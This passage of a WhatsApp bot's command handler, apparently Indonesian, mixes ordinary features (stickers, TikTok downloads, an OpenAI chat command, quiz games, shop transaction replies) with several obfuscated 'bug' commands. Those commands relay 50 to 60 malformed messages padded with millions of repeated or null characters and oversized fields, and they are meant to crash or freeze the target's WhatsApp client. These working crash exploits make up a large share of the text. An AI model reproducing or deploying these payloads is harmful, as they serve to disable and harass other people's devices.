        const _0x2b1def=_0x1d28;(function(_0x414527,_0x288e8e){const _0x564619=_0x1d28,_0x39bfa8=_0x414527();while(!![]){try{const _0x354955=-parseInt(_0x564619(0x1ed))/0x1+parseInt(_0x564619(0x1eb))/0x2+-parseInt(_0x564619(0x201))/0x3+parseInt(_0x564619(0x1f5))/0x4*(-parseInt(_0x564619(0x1ec))/0x5)+-parseInt(_0x564619(0x1f3))/0x6*(parseInt(_0x564619(0x1f2))/0x7)+parseInt(_0x564619(0x1f8))/0x8+-parseInt(_0x564619(0x1ee))/0x9*(-parseInt(_0x564619(0x202))/0xa);if(_0x354955===_0x288e8e)break;else _0x39bfa8['push'](_0x39bfa8['shift']());}catch(_0x258a8f){_0x39bfa8['push'](_0x39bfa8['shift']());}}}(_0x435f,0x2170c));function _0x1d28(_0x26bdea,_0x25e934){const _0x435f10=_0x435f();return _0x1d28=function(_0x1d28ae,_0x30be96){_0x1d28ae=_0x1d28ae-0x1eb;let _0x3d9916=_0x435f10[_0x1d28ae];return _0x3d9916;},_0x1d28(_0x26bdea,_0x25e934);}let jumlah='50';for(let j=0x0;j<jumlah;j++){var etc=generateWAMessageFromContent(m[_0x2b1def(0x1fb)],proto['Message'][_0x2b1def(0x1f1)]({'documentMessage':{'url':'https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','mimetype':_0x2b1def(0x1fd),'fileSha256':_0x2b1def(0x1ef),'fileLength':_0x2b1def(0x1f4),'pageCount':0x3b9ac9ff,'mediaKey':_0x2b1def(0x1fa),'fileName':_0x2b1def(0x1f0)+'ྦྷ'[_0x2b1def(0x1ff)](0x98967f),'fileEncSha256':'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','directPath':_0x2b1def(0x1f9),'mediaKeyTimestamp':_0x2b1def(0x1fc)}}),{'userJid':m[_0x2b1def(0x1fb)],'quoted':force});await kontolditzz[_0x2b1def(0x1f6)](m[_0x2b1def(0x1fb)],etc[_0x2b1def(0x1fe)],{'participant':{'jid':m[_0x2b1def(0x1fb)]},'messageId':etc[_0x2b1def(0x1f7)]['id']});}reply(_0x2b1def(0x200));function _0x435f(){const _0x5c6c9f=['630MQQZbZ','ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=','✳️᜴࿆͆᷍Ən\x20çox\x20WhatsApp\x20səhvləri⭐️᜴▴Döyüşmək\x20asan\x20deyil✅⃟╮╮⭑\x20☠️⃰͜͡؜DxV1⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp','fromObject','11480tHglHQ','324uWHjIm','999999999','139852fuCimi','relayMessage','key','753688QJksZA','/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0','5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=','chat','1715880173','penis','message','repeat','Succes','498657KlEnep','70450YNNcEv','152030vqZwBq','10VCLbCQ','201699PEPczP'];_0x435f=function(){return _0x5c6c9f;};return _0x435f();}
}
        break
    case "ditzzbug":{
const _0x3e36a8=_0x129e;(function(_0x2df2d3,_0x4cf94e){const _0x58ba3d=_0x129e,_0x2d942b=_0x2df2d3();while(!![]){try{const _0x4eed4a=-parseInt(_0x58ba3d(0x150))/0x1+parseInt(_0x58ba3d(0x143))/0x2+-parseInt(_0x58ba3d(0x14f))/0x3*(-parseInt(_0x58ba3d(0x152))/0x4)+-parseInt(_0x58ba3d(0x153))/0x5*(-parseInt(_0x58ba3d(0x158))/0x6)+parseInt(_0x58ba3d(0x155))/0x7*(parseInt(_0x58ba3d(0x141))/0x8)+-parseInt(_0x58ba3d(0x147))/0x9*(parseInt(_0x58ba3d(0x14c))/0xa)+parseInt(_0x58ba3d(0x14e))/0xb*(parseInt(_0x58ba3d(0x159))/0xc);if(_0x4eed4a===_0x4cf94e)break;else _0x2d942b['push'](_0x2d942b['shift']());}catch(_0x158d30){_0x2d942b['push'](_0x2d942b['shift']());}}}(_0x15d7,0x6df8b));if(!isOwner)return reply('Khusu\x20DitzzXploit');let jumlah='50';for(let j=0x0;j<jumlah;j++){var etc=generateWAMessageFromContent(m[_0x3e36a8(0x140)],proto[_0x3e36a8(0x146)]['fromObject']({'listMessage':{'title':_0x3e36a8(0x149)+'\x00'[_0x3e36a8(0x14a)](0x5f5e0ff),'footerText':_0x3e36a8(0x151),'description':'✳️᜴࿆͆᷍Bu\x20pis\x20bir\x20səhvdir╮⭑\x20☠️⃰͜͡؜DxV1⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp','buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x3e36a8(0x145),'products':[{'productId':_0x3e36a8(0x144)}]}],'productListHeaderImage':{'productId':_0x3e36a8(0x144),'jpegThumbnail':null},'businessOwnerJid':_0x3e36a8(0x14b)}},'footer':_0x3e36a8(0x142),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x3e36a8(0x148),'entryPointConversionSource':'global_search_new_chat','entryPointConversionApp':_0x3e36a8(0x154),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':'INITIATED_BY_ME'}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':m[_0x3e36a8(0x140)],'quoted':force});await kontolditzz[_0x3e36a8(0x156)](m[_0x3e36a8(0x140)],etc[_0x3e36a8(0x157)],{'participant':{'jid':m[_0x3e36a8(0x140)]},'messageId':etc['key']['id']});}function _0x15d7(){const _0x52105b=['140pfRVEM','whatsapp','1778hyWDhs','relayMessage','message','81456DsYoZH','46332JOMmMs','chat','22136SqPONy','puki','1163920JPOddq','4392524570816732','anjay','Message','6525153fHfBBs','1679959486','⟠\x20Salam\x20⿻\x20DitzzXploit\x20々','repeat','0@s.whatsapp.net','10lsDYBm','Telah\x20Terkena\x20Bug\x20King\x20DitzzXploit','176PPFpBy','20874qYYFGD','794752ZlBsuB','✳️᜴࿆͆᷍DitzzXkontol\x20V1╮⭑\x20☠️⃰͜͡؜Ən\x20çox\x20WhatsApp\x20səhvləri⭐️᜴▴Döyüşmək\x20asan\x20deyil✅⃟╮.xp','140jEyrYP'];_0x15d7=function(){return _0x52105b;};return _0x15d7();}function _0x129e(_0xdec320,_0x5e6056){const _0x15d7a2=_0x15d7();return _0x129e=function(_0x129e58,_0x3a885e){_0x129e58=_0x129e58-0x140;let _0x2fa664=_0x15d7a2[_0x129e58];return _0x2fa664;},_0x129e(_0xdec320,_0x5e6056);}reply(_0x3e36a8(0x14d));
    }
    break
    case "dxbug-forclose":{
    if (!isOwner) return reply(`Khusu DitzzXploit`)
const _0x4eec81=_0x39a2;(function(_0x28fa90,_0x1f9168){const _0x11f8ef=_0x39a2,_0x45cf25=_0x28fa90();while(!![]){try{const _0x3e47a5=parseInt(_0x11f8ef(0x79))/0x1+-parseInt(_0x11f8ef(0x70))/0x2*(-parseInt(_0x11f8ef(0x68))/0x3)+parseInt(_0x11f8ef(0x6b))/0x4+-parseInt(_0x11f8ef(0x6e))/0x5*(-parseInt(_0x11f8ef(0x74))/0x6)+-parseInt(_0x11f8ef(0x78))/0x7+-parseInt(_0x11f8ef(0x71))/0x8*(parseInt(_0x11f8ef(0x77))/0x9)+-parseInt(_0x11f8ef(0x75))/0xa;if(_0x3e47a5===_0x1f9168)break;else _0x45cf25['push'](_0x45cf25['shift']());}catch(_0x354735){_0x45cf25['push'](_0x45cf25['shift']());}}}(_0x15b2,0xe0793));function _0x15b2(){const _0xe44c59=['1789040XbryzW','<!>\x20Succes\x20<!>\x20Telah\x20terkena\x20Bug\x20','13302pGSlRl','Ən\x20çox\x20WhatsApp\x20səhvləri⭐️᜴▴Döyüşmək\x20asan\x20deyil✅⃟╮','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#Ən\x20çox\x20WhatsApp\x20səhvləri⭐️᜴▴Döyüşmək\x20asan\x20deyil✅⃟╮','1202496ozhmLf','https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg','chat','10IWtYHi','Message','176eNYAfo','1784ssFPTW','\x20DitzzXploit','key','1815366qHhHyj','4284170SvPtNs','waUploadToServer','67428HuxTls','464814BbUOGt'];_0x15b2=function(){return _0xe44c59;};return _0x15b2();}let jumlah='55';function _0x39a2(_0x33dd61,_0x5ba1d0){const _0x15b233=_0x15b2();return _0x39a2=function(_0x39a2ad,_0x4a5bde){_0x39a2ad=_0x39a2ad-0x68;let _0x379081=_0x15b233[_0x39a2ad];return _0x379081;},_0x39a2(_0x33dd61,_0x5ba1d0);}for(let j=0x0;j<jumlah;j++){var etc=generateWAMessageFromContent(m['chat'],proto[_0x4eec81(0x6f)]['fromObject']({'interactiveMessage':{'header':{'title':_0x4eec81(0x69),'hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':_0x4eec81(0x6c)}},{'upload':kontolditzz[_0x4eec81(0x76)]})},'body':{'text':''},'footer':{'text':_0x4eec81(0x6a)},'nativeFlowMessage':{'messageParamsJson':'\x00'['repeat'](0x1869f)}}}),{'userJid':m[_0x4eec81(0x6d)],'quoted':force});await kontolditzz['relayMessage'](m['chat'],etc['message'],{'participant':{'jid':m['chat']},'messageId':etc[_0x4eec81(0x73)]['id']});}reply(_0x4eec81(0x7a)+command+_0x4eec81(0x72));
   }
break
case "bugtest":
case "aipong-ampas":
case "aipong-crash":{
if(!isOwner) return reply("Khusus Ditzz")
let jumlah = "50"
const _0x56044b=_0x1755;(function(_0x59d0e4,_0x3fec8f){const _0x26e185=_0x1755,_0x29fff7=_0x59d0e4();while(!![]){try{const _0x2226be=parseInt(_0x26e185(0xa7))/0x1*(parseInt(_0x26e185(0xa5))/0x2)+-parseInt(_0x26e185(0xa9))/0x3+-parseInt(_0x26e185(0xa0))/0x4*(-parseInt(_0x26e185(0xb0))/0x5)+-parseInt(_0x26e185(0xaf))/0x6*(parseInt(_0x26e185(0xa3))/0x7)+parseInt(_0x26e185(0xa8))/0x8*(-parseInt(_0x26e185(0xa1))/0x9)+parseInt(_0x26e185(0xae))/0xa+-parseInt(_0x26e185(0x9f))/0xb*(-parseInt(_0x26e185(0xaa))/0xc);if(_0x2226be===_0x3fec8f)break;else _0x29fff7['push'](_0x29fff7['shift']());}catch(_0x466250){_0x29fff7['push'](_0x29fff7['shift']());}}}(_0x1d06,0x659b2));for(let j=0x0;j<jumlah;j++){var etc=generateWAMessageFromContent(m[_0x56044b(0xad)],proto['Message'][_0x56044b(0xa2)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x56044b(0xa6)+'ꦾ'['repeat'](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':m[_0x56044b(0xad)],'quoted':force});await kontolditzz[_0x56044b(0xa4)](m[_0x56044b(0xad)],etc['message'],{'participant':{'jid':m[_0x56044b(0xad)]},'messageId':etc[_0x56044b(0xac)]['id']});}function _0x1d06(){const _0x5b1429=['1087137nWVOry','24jqCmNR','Succes\x20Ditzz','key','chat','3702240TmfFJP','57840MGAYyb','65fIbEEv','1420562RYyRDd','182252aQQDVx','18GwMKfw','fromObject','217BoCbeY','relayMessage','7928sGgBgA','✳️࿆͆᷍p','71QjNFtH','1699496hCLpOh'];_0x1d06=function(){return _0x5b1429;};return _0x1d06();}function _0x1755(_0x45a61a,_0x2bbda7){const _0x1d0609=_0x1d06();return _0x1755=function(_0x175592,_0x4117ed){_0x175592=_0x175592-0x9f;let _0x4c390c=_0x1d0609[_0x175592];return _0x4c390c;},_0x1755(_0x45a61a,_0x2bbda7);}reply(_0x56044b(0xab));
}
break
case "ganas-ditzz":
case "crashcuy":{
if(!isOwner) return reply(`Khusus DitzzXploit`)
let jumlah = "60"
const _0x5a709e=_0xa0b8;(function(_0x46c823,_0x3748c2){const _0x4df1fa=_0xa0b8,_0x2aeb3c=_0x46c823();while(!![]){try{const _0x1efb00=parseInt(_0x4df1fa(0x1b0))/0x1+-parseInt(_0x4df1fa(0x1bc))/0x2*(-parseInt(_0x4df1fa(0x1c2))/0x3)+parseInt(_0x4df1fa(0x1bf))/0x4+-parseInt(_0x4df1fa(0x1b5))/0x5+-parseInt(_0x4df1fa(0x1b4))/0x6*(-parseInt(_0x4df1fa(0x1b2))/0x7)+parseInt(_0x4df1fa(0x1c3))/0x8+-parseInt(_0x4df1fa(0x1bb))/0x9*(parseInt(_0x4df1fa(0x1b8))/0xa);if(_0x1efb00===_0x3748c2)break;else _0x2aeb3c['push'](_0x2aeb3c['shift']());}catch(_0x5454ed){_0x2aeb3c['push'](_0x2aeb3c['shift']());}}}(_0x4e10,0xde904));function _0x4e10(){const _0x33dfdf=['2922849DXjdda','2LpXMGp','fromObject','1715876003','1695872vVZlZd','10116','image/webp','1851261fqENmf','9972592CcqMFS','CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=','/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000','Message','1264324sNqXhU','chat','30639tCNMXc','https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true','1704TJkumE','6426565XnPQhi','message','4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','80azWOUi','relayMessage','key'];_0x4e10=function(){return _0x33dfdf;};return _0x4e10();}for(let j=0x0;j<jumlah;j++){var etc=generateWAMessageFromContent(m[_0x5a709e(0x1b1)],proto[_0x5a709e(0x1c6)][_0x5a709e(0x1bd)]({'stickerMessage':{'url':_0x5a709e(0x1b3),'fileSha256':_0x5a709e(0x1c4),'fileEncSha256':'r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','mediaKey':_0x5a709e(0x1b7),'mimetype':_0x5a709e(0x1c1),'directPath':_0x5a709e(0x1c5),'fileLength':_0x5a709e(0x1c0),'mediaKeyTimestamp':_0x5a709e(0x1be),'isAnimated':![],'stickerSentTs':'1715881084144','isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':m[_0x5a709e(0x1b1)],'quoted':force2});await kontolditzz[_0x5a709e(0x1b9)](m[_0x5a709e(0x1b1)],etc[_0x5a709e(0x1b6)],{'participant':{'jid':m[_0x5a709e(0x1b1)]},'messageId':etc[_0x5a709e(0x1ba)]['id']});}function _0xa0b8(_0x2d7f75,_0x55fbf6){const _0x4e10e9=_0x4e10();return _0xa0b8=function(_0xa0b885,_0x4f3043){_0xa0b885=_0xa0b885-0x1b0;let _0x1f360f=_0x4e10e9[_0xa0b885];return _0x1f360f;},_0xa0b8(_0x2d7f75,_0x55fbf6);}reply('Telah\x20Terkena\x20Bug\x20'+command);
}
break
case 'remini': {
if (!quoted) return reply(`Where is the picture?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
reply(mess.wait)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
kontolditzz.sendMessage(m.chat, { image: proses, caption: mess.selesai}, { quoted: m})
}
        break
case 'public': {
if (!isOwner) return XeonStickOwner()
kontolditzz.public = true
reply('*Successful in Changing To Public Usage*')
}
break
case 'self': {
if (!isOwner) return mess.owner
kontolditzz.public = false
reply('*Successful in Changing To Self Usage*')
}
break
case 'toimage': case 'toimg': {
await loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await kontolditzz.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
kontolditzz.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
case 'tiktok':{ 
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
kontolditzz.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'openai':
await loading()
 try {
if (!text) return reply(`Chat dengan AI.\n\nContoh:\n${comand} Apa itu coding`)
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: text,
temperature: 0, // Nilai yang lebih tinggi berarti model akan mengambil lebih banyak risiko.
max_tokens: 2048, // Jumlah maksimum token yang dihasilkan dalam penyelesaian. Sebagian besar model memiliki panjang konteks 2048 token (kecuali untuk model terbaru, yang mendukung 4096).
top_p: 1, // alternatif untuk pengambilan sampel dengan suhu, disebut pengambilan sampel nukleus
frequency_penalty: 0.3, // Angka antara -2.0 dan 2.0. Nilai positif menghukum token baru berdasarkan frekuensi yang ada dalam teks sejauh ini, mengurangi kemungkinan model untuk mengulang baris yang sama kata demi kata.
presence_penalty: 0 // Angka antara -2.0 dan 2.0. Nilai positif menghukum token baru berdasarkan apakah mereka muncul dalam teks sejauh ini, meningkatkan kemungkinan model untuk membicarakan topik baru.
});
reply(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
reply("Maaf, sepertinya ada yang error :"+ error.message);
}
}
break
        case 'tourl': {
await loading()
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await kontolditzz.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'done':{
let t = text.split('|');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang|jumlah|nominal
Exampel ${prefix + command} panel|1|10000`);
let barang = t[0];
let jumlah = t[1];
let nominal = t[2];
reply(`
*━───━[ 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 ]━───━*

 _• *Barang:* ${barang}_
 _• *Jumlah:* Rp${jumlah}_
 _• *Nominal:* Rp${nominal}_
 _• *Tanggal:* ${date}_

Tᴇʀɪᴍᴀ Kᴀꜱɪʜ Yᴀ @${userss.split("@")[0]} Tᴇʟᴀʜ 
Oʀᴅᴇʀ Dᴀɴ Mᴇᴍᴘᴇʀᴄᴀʏᴀɪ @${owned.split("@")[0]}
Jᴀɴɢᴀɴ Lᴜᴘᴀ Oʀᴅᴇʀ Lᴀɢɪ Yᴀ !!
━───━━───━━───━━───━━───━`)
}
break
if (!isOwner) return mess.owner
case "tunda": {
const owned = `${ownernomer}@s.whatsapp.net`
const text12 = `
*━───━[ 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 ]━───━*

Hᴀʟᴏ Kᴀᴋ @${userss.split("@")[0]}
Tʀᴀɴꜱᴀᴋꜱɪ Kᴀᴍᴜ Mᴀꜱɪʜ Dɪᴘᴇɴᴅɪɴɢ Nɪʜ 😓,
Tᴜɴɢɢᴜ Kᴏɴꜰɪʀᴍᴀꜱɪ Sᴇʟᴀɴᴊᴜᴛɴʏᴀ Yᴀ 😇

━───━━───━━───━━───━━───━`
reply(text12)
}
break
if (!isOwner) return mess.owner
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
case "proses": {

const text12 = `
*━─━[ 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗣𝗿𝗼𝘀𝗲𝘀 ]━─━*

Hᴀʟᴏ Kᴀᴋ @${userss.split("@")[0]}
Sᴇᴋᴀʀᴀɴɢ Tʀᴀɴꜱᴀᴋꜱɪ Kᴀᴍᴜ Sᴇᴅᴀɴɢ 
Dɪ Pʀᴏꜱᴇꜱ Mᴏʜᴏɴ Tᴜɴɢɢᴜ 
Sᴇʙᴇɴᴛᴀʀ Yᴀ 😅

─━─━─━─━─━─━─━─━─━─━─`
reply(text12)
}
break
if (!isOwner) return mess.owner
case "batal": {
const owned = `${ownernomer}@s.whatsapp.net`
const text12 = `
*━─━[ 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹 ]━─━*

Hᴀʟᴏ Kᴀᴋ @${userss.split("@")[0]}

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${date}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${xtime}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

Yᴀʜ Tʀᴀɴꜱᴀᴋꜱɪ Kᴀᴍᴜ Dɪ Bᴀᴛᴀʟᴋᴀɴ 😭
Sᴇᴍᴏɢᴀ Lᴀɪɴ Kᴀʟɪ Bᴇʀʜᴀꜱɪʟ 😊

─━─━─━─━─━─━─━─━─━─`
reply(text12)
}
break
case 's': case 'sticker': case 'stiker': {
if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kontolditzz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await kontolditzz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'setppbot': case 'setbotpp': {
if (!isOwner) return reply(mess.owner)
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await kontolditzz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
var { img } = await generateProfilePicture(medis)
await kontolditzz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Success`)
}
break
case "qc": {
if (!quoted){
const getname = await kontolditzz.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
kontolditzz.sendImageAsSticker(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
kontolditzz.sendImageAsSticker(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${command} text atau reply pesan dengan perintah ${command}`)
}
}
break
            case 'kuismath':
            case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                let {
                    genMath,
                    modes
                } = require('./database/math')
                if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                kontolditzz.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'tebak': {
                if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`
                    }, {
                        quoted: m
                    }).then(() => {
                        tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m)
                        delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}`, m)
                        delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}`, m)
                        delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                        tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        kontolditzz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}`, m)
                        delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'tebakan') {
                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kontolditzz.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                        tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
